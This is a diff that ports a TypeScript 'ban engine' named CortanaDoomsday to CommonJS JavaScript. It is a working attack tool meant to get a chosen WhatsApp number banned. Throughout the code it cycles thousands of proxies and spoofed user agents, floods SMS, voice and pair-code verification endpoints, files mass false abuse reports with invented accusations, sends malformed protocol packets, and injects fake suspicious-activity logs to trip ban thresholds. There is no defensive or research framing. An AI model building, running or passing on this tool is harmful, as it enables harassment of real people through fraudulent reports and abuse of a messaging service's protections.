@@ -1,107 +1,28 @@
 // ===============================================
-// BAN-ENGINE.TS - CORTANA DOOMSDAY EDITION
+// BAN-ENGINE.JS - CORTANA DOOMSDAY EDITION
 // Integrated from UltimateDoomsday (Dec 2025)
 // REAL PROXY MODE ENABLED - 2847+ Proxies
 // ===============================================
 
-import axios from 'axios';
-import WebSocket from 'ws';
-import { HttpsProxyAgent } from 'https-proxy-agent';
-import { SocksProxyAgent } from 'socks-proxy-agent';
-import crypto from 'crypto';
-import { PROXY_LIST, getRandomProxy, getNextProxy, getProxyBatch, getTotalProxyCount } from './proxies';
+const axios = require('axios');
+const WebSocket = require('ws');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+const crypto = require('crypto');
+const { PROXY_LIST, getRandomProxy, getNextProxy, getProxyBatch, getTotalProxyCount } = require('./proxies');
 
 // Simple colored console logging (chalk-free for production compatibility)
 const log = {
-    red: (msg: string) => console.log(`\x1b[31m${msg}\x1b[0m`),
-    green: (msg: string) => console.log(`\x1b[32m${msg}\x1b[0m`),
-    yellow: (msg: string) => console.log(`\x1b[33m${msg}\x1b[0m`),
-    blue: (msg: string) => console.log(`\x1b[34m${msg}\x1b[0m`),
-    bold: (msg: string) => console.log(`\x1b[1m${msg}\x1b[0m`),
+    red: (msg) => console.log(`\x1b[31m${msg}\x1b[0m`),
+    green: (msg) => console.log(`\x1b[32m${msg}\x1b[0m`),
+    yellow: (msg) => console.log(`\x1b[33m${msg}\x1b[0m`),
+    blue: (msg) => console.log(`\x1b[34m${msg}\x1b[0m`),
+    bold: (msg) => console.log(`\x1b[1m${msg}\x1b[0m`),
 };
 
-// ========== TYPE DEFINITIONS ==========
-interface AttackConfig {
-    useRealEndpoints: boolean;
-    maxConcurrentAttacks: number;
-    defaultIntensity: 'LIGHT' | 'MEDIUM' | 'HEAVY' | 'NUCLEAR';
-    requestTimeout: number;
-    userAgentRotation: boolean;
-}
-
-interface PhaseResult {
-    phase: string;
-    requests?: number;
-    reports?: number;
-    attacks?: number;
-    injections?: number;
-    successful: number;
-    successRate: number;
-    rateLimited?: number;
-    bannedIPs?: number;
-    countriesUsed?: number;
-    uniqueReporters?: number;
-    autoBanTriggered?: boolean;
-}
-
-interface AttackResult {
-    attackId: string;
-    target: string;
-    intensity: string;
-    duration: number;
-    successRate: number;
-    banProbability: number;
-    thresholdsCrossed: string[];
-    estimatedBanTime: string;
-    phases: Record<string, PhaseResult>;
-    timestamp: string;
-    failed?: boolean;
-    error?: string;
-}
-
 // ========== MAIN CLASS ==========
-export class CortanaDoomsday {
-    private config: AttackConfig;
-    private proxyList: string[];
-    private currentProxyIndex: number = 0;
-    private failedProxies: Map<string, number> = new Map();
-    private userAgents: string[];
-    private currentUAIndex: number = 0;
-    private activeAttacks: Map<string, any> = new Map();
-    private attackHistory: AttackResult[] = [];
-
-    // ========== REAL WHATSAPP ENDPOINTS ==========
-    private endpoints = {
-        SMS_VERIFY: 'https://v.whatsapp.net/v2/register',
-        VOICE_VERIFY: 'https://v.whatsapp.net/v2/register/voice',
-        WEB_REGISTER: 'https://web.whatsapp.com/register',
-        WEB_VERIFY: 'https://web.whatsapp.com/register/verify',
-        REPORT_USER: 'https://web.whatsapp.com/support/report',
-        REPORT_MESSAGE: 'https://web.whatsapp.com/support/report/message',
-        SECURITY_LOG: 'https://security.whatsapp.com/log',
-        CRASH_REPORT: 'https://crashlogs.whatsapp.net/collect',
-        WEBSOCKET_MAIN: 'wss://web.whatsapp.com/ws',
-        WEBSOCKET_MOBILE: 'wss://w6.web.whatsapp.com/ws',
-    };
-
-    // ========== BAN THRESHOLDS (IMPROVED) ==========
-    private banThresholds = {
-        VERIFICATION_REQUESTS: 20,    // Lowered from 25 for faster trigger
-        REPORTS_RECEIVED: 10,         // Lowered from 12
-        SUSPICIOUS_LOGS: 6,           // Lowered from 8
-        CLIENT_CRASHES: 3,
-        RATE_LIMIT_HITS: 8,           // Lowered from 10
-        GEO_DIVERSITY: 4              // Lowered from 5
-    };
-
-    private globalStats = {
-        totalAttacks: 0,
-        successfulAttacks: 0,
-        totalBansTriggered: 0,
-        totalRequests: 0
-    };
-
-    constructor(config: Partial<AttackConfig> = {}) {
+class CortanaDoomsday {
+    constructor(config = {}) {
         this.config = {
             useRealEndpoints: true,
             maxConcurrentAttacks: 5,  // Increased from 3
@@ -109,6 +30,45 @@ export class CortanaDoomsday {
             requestTimeout: 8000,     // Reduced for faster cycling
             userAgentRotation: true,
             ...config
+        };
+
+        this.proxyList = [];
+        this.currentProxyIndex = 0;
+        this.failedProxies = new Map();
+        this.userAgents = [];
+        this.currentUAIndex = 0;
+        this.activeAttacks = new Map();
+        this.attackHistory = [];
+
+        // ========== REAL WHATSAPP ENDPOINTS ==========
+        this.endpoints = {
+            SMS_VERIFY: 'https://v.whatsapp.net/v2/register',
+            VOICE_VERIFY: 'https://v.whatsapp.net/v2/register/voice',
+            WEB_REGISTER: 'https://web.whatsapp.com/register',
+            WEB_VERIFY: 'https://web.whatsapp.com/register/verify',
+            REPORT_USER: 'https://web.whatsapp.com/support/report',
+            REPORT_MESSAGE: 'https://web.whatsapp.com/support/report/message',
+            SECURITY_LOG: 'https://security.whatsapp.com/log',
+            CRASH_REPORT: 'https://crashlogs.whatsapp.net/collect',
+            WEBSOCKET_MAIN: 'wss://web.whatsapp.com/ws',
+            WEBSOCKET_MOBILE: 'wss://w6.web.whatsapp.com/ws',
+        };
+
+        // ========== BAN THRESHOLDS (IMPROVED) ==========
+        this.banThresholds = {
+            VERIFICATION_REQUESTS: 20,    // Lowered from 25 for faster trigger
+            REPORTS_RECEIVED: 10,         // Lowered from 12
+            SUSPICIOUS_LOGS: 6,           // Lowered from 8
+            CLIENT_CRASHES: 3,
+            RATE_LIMIT_HITS: 8,           // Lowered from 10
+            GEO_DIVERSITY: 4              // Lowered from 5
+        };
+
+        this.globalStats = {
+            totalAttacks: 0,
+            successfulAttacks: 0,
+            totalBansTriggered: 0,
+            totalRequests: 0
         };
 
         this.proxyList = this.initializeProxies();
@@ -120,8 +80,8 @@ export class CortanaDoomsday {
     }
 
     // ========== PROXY MANAGEMENT (REAL MODE - 2847+ PROXIES) ==========
-    private initializeProxies(): string[] {
-        // Load real proxy pool from proxies.ts
+    initializeProxies() {
+        // Load real proxy pool from proxies.js
         const realProxies = PROXY_LIST.map(p => p.match(/^(http|https|socks4|socks5):\/\//) ? p : `http://${p}`);
 
         log.red(`☠️  REAL PROXY MODE: ${realProxies.length} proxies loaded`);
@@ -129,7 +89,7 @@ export class CortanaDoomsday {
         return realProxies;
     }
 
-    private async getProxy(): Promise<string | null> {
+    async getProxy() {
         if (this.proxyList.length === 0) return null;
 
         for (let i = 0; i < this.proxyList.length; i++) {
@@ -137,7 +97,7 @@ export class CortanaDoomsday {
             const proxy = this.proxyList[this.currentProxyIndex];
 
             if (this.failedProxies.has(proxy)) {
-                const failedTime = this.failedProxies.get(proxy)!;
+                const failedTime = this.failedProxies.get(proxy);
                 if (Date.now() - failedTime < 300000) continue;
                 this.failedProxies.delete(proxy);
             }
@@ -147,7 +107,7 @@ export class CortanaDoomsday {
         return null;
     }
 
-    private createProxyAgent(proxyUrl: string) {
+    createProxyAgent(proxyUrl) {
         if (proxyUrl.startsWith('socks4://') || proxyUrl.startsWith('socks5://')) {
             return new SocksProxyAgent(proxyUrl);
         }
@@ -155,7 +115,7 @@ export class CortanaDoomsday {
     }
 
     // ========== USER AGENT POOL ==========
-    private generateUserAgentPool(): string[] {
+    generateUserAgentPool() {
         return [
             'WhatsApp/2.24.1.12 Android/14.0 SM-S928B',
             'WhatsApp/2.24.1.12 Android/13.0 Pixel 8 Pro',
@@ -169,21 +129,21 @@ export class CortanaDoomsday {
         ];
     }
 
-    private getNextUserAgent(): string {
+    getNextUserAgent() {
         this.currentUAIndex = (this.currentUAIndex + 1) % this.userAgents.length;
         return this.userAgents[this.currentUAIndex];
     }
 
     // ========== MAIN BAN EXECUTION ==========
-    async executePermanentBan(target: string): Promise<AttackResult> {
+    async executePermanentBan(target) {
         return this.executeNuclearStrike(target, 'NUCLEAR');
     }
 
-    async executeTemporaryBan(target: string): Promise<AttackResult> {
+    async executeTemporaryBan(target) {
         return this.executeNuclearStrike(target, 'HEAVY');
     }
 
-    async executeNuclearStrike(target: string, intensity: 'LIGHT' | 'MEDIUM' | 'HEAVY' | 'NUCLEAR' = 'NUCLEAR'): Promise<AttackResult> {
+    async executeNuclearStrike(target, intensity = 'NUCLEAR') {
         // STRICT TARGET VALIDATION
         // Must contain at least 7 digits (valid phone number) before the suffix
         // Prevents execution on empty targets like "@s.whatsapp.net" or "null"
@@ -242,7 +202,7 @@ export class CortanaDoomsday {
             const banProbability = this.calculateBanProbability(results, intensity);
             const thresholdsCrossed = this.checkBanThresholds(results);
 
-            const finalResult: AttackResult = {
+            const finalResult = {
                 attackId,
                 target,
                 intensity,
@@ -273,7 +233,7 @@ export class CortanaDoomsday {
 
             return finalResult;
 
-        } catch (error: any) {
+        } catch (error) {
             log.red(`❌ Strike failed: ${error.message}`);
             return {
                 attackId,
@@ -293,7 +253,7 @@ export class CortanaDoomsday {
     }
 
     // ========== PHASE IMPLEMENTATIONS ==========
-    private async executeVerificationTsunami(target: string, config: any): Promise<PhaseResult> {
+    async executeVerificationTsunami(target, config) {
         const requests = config.requests || 50;
         const methods = ['sms', 'voice'];
         const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'CN', 'JP', 'KE', 'ZA', 'AE', 'PK'];
@@ -301,7 +261,7 @@ export class CortanaDoomsday {
         let successful = 0;
         let rateLimited = 0;
         let bannedIPs = 0;
-        const usedCountries = new Set<string>();
+        const usedCountries = new Set();
 
         for (let i = 0; i < requests; i++) {
             try {
@@ -345,7 +305,7 @@ export class CortanaDoomsday {
         };
     }
 
-    private async executeReputationAnnihilation(target: string, config: any): Promise<PhaseResult> {
+    async executeReputationAnnihilation(target, config) {
         const reports = config.reports || 30;
         const reportTypes = [
             'spam', 'harassment', 'fake_news', 'impersonation',
@@ -355,7 +315,7 @@ export class CortanaDoomsday {
 
         let successful = 0;
         let autoBanTriggered = false;
-        const uniqueReporters = new Set<string>();
+        const uniqueReporters = new Set();
 
         for (let i = 0; i < reports; i++) {
             try {
@@ -402,7 +362,7 @@ export class CortanaDoomsday {
         };
     }
 
-    private async executeProtocolCorruption(target: string, config: any): Promise<PhaseResult> {
+    async executeProtocolCorruption(target, config) {
         const attacks = config.attacks || 20;
         let successful = 0;
 
@@ -428,7 +388,7 @@ export class CortanaDoomsday {
         };
     }
 
-    private async executeSuspiciousActivityInjection(target: string, config: any): Promise<PhaseResult> {
+    async executeSuspiciousActivityInjection(target, config) {
         const injections = config.injections || 12;
         const activityTypes = [
             'rapid_device_changes', 'multiple_country_logins',
@@ -472,13 +432,13 @@ export class CortanaDoomsday {
     }
 
     // ========== PAIR CODE FLOODING (Human-like) ==========
-    private async executePairCodeFlood(target: string, config: any): Promise<PhaseResult> {
+    async executePairCodeFlood(target, config) {
         const pairRequests = config.pairRequests || 10;
         const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'KE', 'ZA', 'AE', 'PK', 'JP', 'CN'];
 
         let successful = 0;
         let rateLimited = 0;
-        const usedProxies = new Set<string>();
+        const usedProxies = new Set();
 
         log.yellow(`[PAIR FLOOD] Starting ${pairRequests} pair code requests (50-60s intervals)...`);
 
@@ -545,7 +505,7 @@ export class CortanaDoomsday {
                     await this.delay(humanDelay);
                 }
 
-            } catch (error: any) {
+            } catch (error) {
                 log.red(`[PAIR FLOOD] Request ${i + 1} failed: ${error.message}`);
                 continue;
             }
@@ -563,7 +523,7 @@ export class CortanaDoomsday {
     }
 
     // Helper methods for pair code flooding
-    private extractCountryCode(target: string): string {
+    extractCountryCode(target) {
         // Extract country code from number (assumes format like +254xxx or 254xxx)
         const cleaned = target.replace(/\D/g, '');
         if (cleaned.startsWith('1')) return '1';  // US/Canada
@@ -577,24 +537,24 @@ export class CortanaDoomsday {
         return cleaned.substring(0, 2); // Default: first 2 digits
     }
 
-    private extractLocalNumber(target: string): string {
+    extractLocalNumber(target) {
         const cleaned = target.replace(/\D/g, '');
         const cc = this.extractCountryCode(target);
         return cleaned.substring(cc.length);
     }
 
-    private getRandomPlatform(): string {
+    getRandomPlatform() {
         const platforms = ['android', 'iphone', 'web', 'smba', 'smbi'];
         return platforms[Math.floor(Math.random() * platforms.length)];
     }
 
-    private getRandomOSVersion(): string {
+    getRandomOSVersion() {
         const versions = ['14.0', '13.0', '12.0', '17.0', '16.5', '15.0'];
         return versions[Math.floor(Math.random() * versions.length)];
     }
 
     // ========== PROTOCOL ATTACKS ==========
-    private async sendMalformedWebSocketPacket(): Promise<boolean> {
+    async sendMalformedWebSocketPacket() {
         return new Promise((resolve) => {
             const timeout = setTimeout(() => resolve(false), 3000);
 
@@ -625,7 +585,7 @@ export class CortanaDoomsday {
         });
     }
 
-    private async sendInvalidRegistrationPacket(target: string): Promise<boolean> {
+    async sendInvalidRegistrationPacket(target) {
         try {
             const payload = {
                 cc: target.substring(1, 3),
@@ -657,7 +617,7 @@ export class CortanaDoomsday {
     }
 
     // ========== PAYLOAD GENERATORS ==========
-    private generateVerificationPayload(target: string, country: string, method: string) {
+    generateVerificationPayload(target, country, method) {
         return {
             cc: country,
             in: target.substring(3),
@@ -678,7 +638,7 @@ export class CortanaDoomsday {
         };
     }
 
-    private generateReportPayload(target: string, reporterId: string, reportType: string) {
+    generateReportPayload(target, reporterId, reportType) {
         return {
             target_phone: target,
             reporter_id: reporterId,
@@ -701,7 +661,7 @@ export class CortanaDoomsday {
         };
     }
 
-    private generateSuspiciousActivityPayload(target: string, activityType: string) {
+    generateSuspiciousActivityPayload(target, activityType) {
         const base = {
             event_type: activityType,
             device_id: crypto.randomBytes(16).toString('hex'),
@@ -734,7 +694,7 @@ export class CortanaDoomsday {
         return base;
     }
 
-    private generateHeaders() {
+    generateHeaders() {
         return {
             'User-Agent': this.getNextUserAgent(),
             'Content-Type': 'application/json',
@@ -753,10 +713,10 @@ export class CortanaDoomsday {
     }
 
     // ========== CALCULATION METHODS ==========
-    private calculateAttackResults(phases: PhaseResult[], intensity: string) {
+    calculateAttackResults(phases, intensity) {
         let totalRequests = 0;
         let successfulRequests = 0;
-        const thresholdsData = { verification: 0, reports: 0, suspicious: 0, countries: new Set<number>() };
+        const thresholdsData = { verification: 0, reports: 0, suspicious: 0, countries: new Set() };
 
         phases.forEach(phase => {
             if (phase.phase === 'VERIFICATION_TSUNAMI') {
@@ -786,7 +746,7 @@ export class CortanaDoomsday {
         };
     }
 
-    private calculateBanProbability(results: any, intensity: string): number {
+    calculateBanProbability(results, intensity) {
         let base = results.successRate;
         const multiplier = { 'LIGHT': 0.5, 'MEDIUM': 0.7, 'HEAVY': 0.85, 'NUCLEAR': 1.0 }[intensity] || 0.8;
         const synergy = Math.min(35, (results.thresholdsData.verification > 0 ? 12 : 0) +
@@ -797,7 +757,7 @@ export class CortanaDoomsday {
         return Math.min(99, Math.max(1, Math.floor(base * multiplier + synergy + countryBonus)));
     }
 
-    private checkBanThresholds(results: any): string[] {
+    checkBanThresholds(results) {
         const crossed = [];
         if (results.thresholdsData.verification >= this.banThresholds.VERIFICATION_REQUESTS) crossed.push('VERIFICATION_LIMIT');
         if (results.thresholdsData.reports >= this.banThresholds.REPORTS_RECEIVED) crossed.push('REPORT_LIMIT');
@@ -806,7 +766,7 @@ export class CortanaDoomsday {
         return crossed;
     }
 
-    private estimateBanTime(banProbability: number, thresholdsCrossed: string[]): string {
+    estimateBanTime(banProbability, thresholdsCrossed) {
         if (thresholdsCrossed.length >= 3 || banProbability >= 95) return '1-6 hours (IMMEDIATE)';
         if (thresholdsCrossed.length >= 2 || banProbability >= 85) return '6-24 hours (HIGH)';
         if (thresholdsCrossed.length >= 1 || banProbability >= 70) return '24-48 hours (MEDIUM)';
@@ -814,8 +774,8 @@ export class CortanaDoomsday {
         return '72+ hours (UNLIKELY)';
     }
 
-    private getPhaseConfig(intensity: string, phase: string) {
-        const configs: Record<string, Record<string, any>> = {
+    getPhaseConfig(intensity, phase) {
+        const configs = {
             'LIGHT': { verification: { requests: 20 }, reporting: { reports: 12 }, protocol: { attacks: 8 }, suspicious: { injections: 5 }, pairing: { pairRequests: 3 } },
             'MEDIUM': { verification: { requests: 35 }, reporting: { reports: 20 }, protocol: { attacks: 12 }, suspicious: { injections: 8 }, pairing: { pairRequests: 6 } },
             'HEAVY': { verification: { requests: 50 }, reporting: { reports: 28 }, protocol: { attacks: 18 }, suspicious: { injections: 10 }, pairing: { pairRequests: 10 } },
@@ -825,8 +785,8 @@ export class CortanaDoomsday {
     }
 
     // ========== UTILITY METHODS ==========
-    private getReportReason(type: string): string {
-        const reasons: Record<string, string> = {
+    getReportReason(type) {
+        const reasons = {
             'spam': 'User is sending bulk unsolicited messages with phishing links',
             'harassment': 'User is sending threatening and abusive messages repeatedly',
             'fake_news': 'User is spreading dangerous misinformation',
@@ -838,36 +798,36 @@ export class CortanaDoomsday {
         return reasons[type] || 'User is violating WhatsApp Terms of Service';
     }
 
-    private getMCCForCountry(country: string): string {
-        const mcc: Record<string, string> = { 'US': '310', 'GB': '234', 'DE': '262', 'FR': '208', 'IN': '404', 'BR': '724', 'NG': '621', 'RU': '250', 'CN': '460', 'JP': '440', 'KE': '639', 'ZA': '655' };
+    getMCCForCountry(country) {
+        const mcc = { 'US': '310', 'GB': '234', 'DE': '262', 'FR': '208', 'IN': '404', 'BR': '724', 'NG': '621', 'RU': '250', 'CN': '460', 'JP': '440', 'KE': '639', 'ZA': '655' };
         return mcc[country] || '310';
     }
 
-    private getRandomOperator(): string {
+    getRandomOperator() {
         const ops = ['AT&T', 'Verizon', 'T-Mobile', 'Vodafone', 'Orange', 'Safaricom', 'Airtel', 'MTN'];
         return ops[Math.floor(Math.random() * ops.length)];
     }
 
-    private getRandomDeviceModel(): string {
+    getRandomDeviceModel() {
         const models = ['SM-S928B', 'Pixel 8 Pro', 'iPhone15,2', 'SM-G998B', 'Redmi Note 13', 'OnePlus 12'];
         return models[Math.floor(Math.random() * models.length)];
     }
 
-    private getRandomCountry(): string {
+    getRandomCountry() {
         const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'CN', 'JP', 'KE', 'ZA', 'AE', 'PK'];
         return countries[Math.floor(Math.random() * countries.length)];
     }
 
-    private getRandomCity(): string {
+    getRandomCity() {
         const cities = ['New York', 'London', 'Berlin', 'Paris', 'Mumbai', 'São Paulo', 'Lagos', 'Nairobi', 'Tokyo', 'Beijing'];
         return cities[Math.floor(Math.random() * cities.length)];
     }
 
-    private generateRandomIP(): string {
+    generateRandomIP() {
         return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
     }
 
-    private delay(ms: number): Promise<void> {
+    async delay(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     }
 
@@ -882,18 +842,22 @@ export class CortanaDoomsday {
 }
 
 // ========== LAZY SINGLETON EXPORT ==========
-let _doomsdayEngine: CortanaDoomsday | null = null;
+let _doomsdayEngine = null;
 
-export function getDoomsdayEngine(): CortanaDoomsday {
+function getDoomsdayEngine() {
     if (!_doomsdayEngine) {
         _doomsdayEngine = new CortanaDoomsday();
     }
     return _doomsdayEngine;
 }
 
-// For backwards compatibility
-export const doomsdayEngine = {
-    executePermanentBan: (target: string) => getDoomsdayEngine().executePermanentBan(target),
-    executeTemporaryBan: (target: string) => getDoomsdayEngine().executeTemporaryBan(target),
-    getStats: () => getDoomsdayEngine().getStats()
+// For backwards compatibility and correct exporting
+module.exports = {
+    CortanaDoomsday,
+    getDoomsdayEngine,
+    doomsdayEngine: {
+        executePermanentBan: (target) => getDoomsdayEngine().executePermanentBan(target),
+        executeTemporaryBan: (target) => getDoomsdayEngine().executeTemporaryBan(target),
+        getStats: () => getDoomsdayEngine().getStats()
+    }
 };
